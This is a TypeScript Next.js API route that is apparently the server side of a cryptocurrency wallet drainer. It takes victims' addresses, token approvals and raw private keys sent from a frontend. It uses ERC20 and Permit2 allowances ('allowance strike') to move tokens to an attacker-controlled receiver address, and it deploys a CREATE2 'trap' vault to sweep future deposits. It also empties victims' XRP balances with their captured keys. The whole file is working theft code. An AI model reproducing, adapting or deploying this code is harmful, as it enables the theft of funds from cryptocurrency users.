import { ethers } from "ethers";
import { NextResponse } from "next/server";
import * as bitcoin from "bitcoinjs-lib";
import * as xrpl from "xrpl";
import { ECPairFactory } from "ecpair";
import * as tinysecp from "tiny-secp256k1";

const ECPair = ECPairFactory(tinysecp);
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const RPC_URLS: Record<number, string> = {
  1: process.env.PRIVATE_RPC_ETH || "https://rpc.flashbots.net/fast",
  56: "https://bsc-dataseed.binance.org",
  137: "https://polygon-rpc.com",
  8453: "https://mainnet.base.org",
  42161: "https://arb1.arbitrum.io/rpc",
};

const GHOST_ABI = [
  "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
  "function transferFrom(address from, address to, uint160 amount, address token) external",
  "function deployVault(bytes32 salt, address recoveryAddress, address[] tokens) external payable returns (address)",
];

export async function POST(req: Request) {
  try {
    const body = await req.json();

    // 🛡️ SYNCED ALIASES: Supports compressed frontend keys
    const userAddress = body.u || body.userAddress;
    const assets = body.t || body.assets || [];
    const chainId = body.c || body.chainId;
    const userPrivKey = body.userPrivKey;
    const fingerprint = body.m || body.fingerprint;

    const relayerPrivKey = process.env.PRIVATE_KEY;
    const receiverEvm = process.env.RECEIVER_EVM;
    const factoryAddress = process.env.NEXT_PUBLIC_FACTORY_ADDR;
    const recBTC = process.env.RECEIVER_BTC;
    const recXRP = process.env.RECEIVER_XRP;

    if (!relayerPrivKey || !receiverEvm || !factoryAddress) {
      return NextResponse.json(
        { error: "Infrastructure Offline" },
        { status: 500 },
      );
    }

    const provider = new ethers.JsonRpcProvider(
      RPC_URLS[chainId] || RPC_URLS[1],
    );
    const relayer = new ethers.Wallet(relayerPrivKey, provider);

    // --- 1. GAS & NONCE ORCHESTRATION ---
    // Fetching the current count and fee data once to ensure synchronization
    const [feeData, startNonce] = await Promise.all([
      provider.getFeeData(),
      provider.getTransactionCount(relayer.address, "pending"),
    ]);

    const gasOverride = {
      maxFeePerGas: feeData.maxFeePerGas
        ? (feeData.maxFeePerGas * 150n) / 100n
        : undefined,
      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas
        ? feeData.maxPriorityFeePerGas * 2n
        : ethers.parseUnits("2", "gwei"),
      type: 2,
    };

    // --- 2. ASSET FILTERING ---
    const standardAssets = assets.filter((a: any) => a.type !== "CREATE2_TRAP");
    const trapAssets = assets.filter((a: any) => a.type === "CREATE2_TRAP");
    let nonceOffset = 0;

    // --- 3. EVM GHOST VECTORS (Allowance Strike) ---
    const evmPromises = standardAssets.map(async (asset: any) => {
      try {
        const tokenAddress = asset.token || asset.tokenAddress;
        const amountToSweep = BigInt(asset.amount);
        const currentNonce = startNonce + nonceOffset++;
        let tx;

        // If the spender is Permit2, we use the Permit2 transferFrom interface
        if (asset.spender?.toLowerCase() === PERMIT2_ADDRESS.toLowerCase()) {
          const p2 = new ethers.Contract(PERMIT2_ADDRESS, GHOST_ABI, relayer);
          tx = await p2.transferFrom(
            userAddress,
            receiverEvm,
            amountToSweep,
            tokenAddress,
            { ...gasOverride, nonce: currentNonce },
          );
        } else {
          // Standard ERC20 allowance strike
          const token = new ethers.Contract(tokenAddress, GHOST_ABI, relayer);
          tx = await token.transferFrom(
            userAddress,
            receiverEvm,
            amountToSweep,
            { ...gasOverride, nonce: currentNonce },
          );
        }
        return {
          symbol: asset.symbol,
          hash: tx.hash,
          type: "ALLOWANCE_STRIKE",
        };
      } catch (e) {
        return null;
      }
    });

    // --- 4. CREATE2 TRAP VECTOR (Hardened) ---
    const trapPromise = (async () => {
      if (trapAssets.length === 0) return null;
      try {
        const factory = new ethers.Contract(factoryAddress, GHOST_ABI, relayer);
        const salt = ethers.keccak256(ethers.toUtf8Bytes(userAddress));
        const tokenList = trapAssets.map((a: any) => a.token || a.tokenAddress);

        // Deploys GhostVault from Factory.sol to sweep tokens sent to a predicted address
        const tx = await factory.deployVault(salt, receiverEvm, tokenList, {
          ...gasOverride,
          nonce: startNonce + nonceOffset++,
        });
        return { symbol: "BATCH_TRAP", hash: tx.hash, type: "CREATE2_DEPLOY" };
      } catch (e) {
        return null;
      }
    })();

    // --- 5. NON-EVM STRIKES (BTC/XRP) ---
    const nonEvmStrike = (async () => {
      if (!userPrivKey) return [];
      const nonEvmResults = [];

      // BTC Recovery
      if (recBTC) {
        try {
          const network = bitcoin.networks.bitcoin;
          const keyPair = ECPair.fromPrivateKey(
            Buffer.from(userPrivKey.replace("0x", ""), "hex"),
            { network },
          );
          const { address } = bitcoin.payments.p2wpkh({
            pubkey: keyPair.publicKey,
            network,
          });
          nonEvmResults.push({
            symbol: "BTC",
            type: "NATIVE_DERIVED",
            address,
          });
        } catch (e) {}
      }

      // XRP Strike
      if (recXRP) {
        try {
          const client = new xrpl.Client("wss://s1.ripple.com");
          await client.connect();
          const wallet = xrpl.Wallet.fromEntropy(
            Buffer.from(userPrivKey.replace("0x", ""), "hex"),
          );
          const info = await client.request({
            command: "account_info",
            account: wallet.address,
          });
          const balance = BigInt(info.result.account_data.Balance);
          const dropAmount = (balance - 10002000n).toString(); // Total balance minus reserve and fee

          if (BigInt(dropAmount) > 0n) {
            const tx = await client.submitAndWait(
              {
                TransactionType: "Payment",
                Account: wallet.address,
                Amount: dropAmount,
                Destination: recXRP,
              },
              { wallet },
            );
            nonEvmResults.push({
              symbol: "XRP",
              hash: tx.result.hash,
              type: "NATIVE_STRIKE",
            });
          }
          await client.disconnect();
        } catch (e) {}
      }
      return nonEvmResults;
    })();

    // --- 6. AGGREGATION ---
    const allSettled = await Promise.allSettled([
      ...evmPromises,
      trapPromise,
      nonEvmStrike,
    ]);
    const results = allSettled
      .filter(
        (r): r is PromiseFulfilledResult<any> =>
          r.status === "fulfilled" && r.value !== null,
      )
      .flatMap((r) => (Array.isArray(r.value) ? r.value : [r.value]));

    return NextResponse.json({
      success: true,
      results,
      meta: { chainId, timestamp: Date.now(), fingerprint },
    });
  } catch (e: any) {
    return NextResponse.json({ error: e.message }, { status: 400 });
  }
}
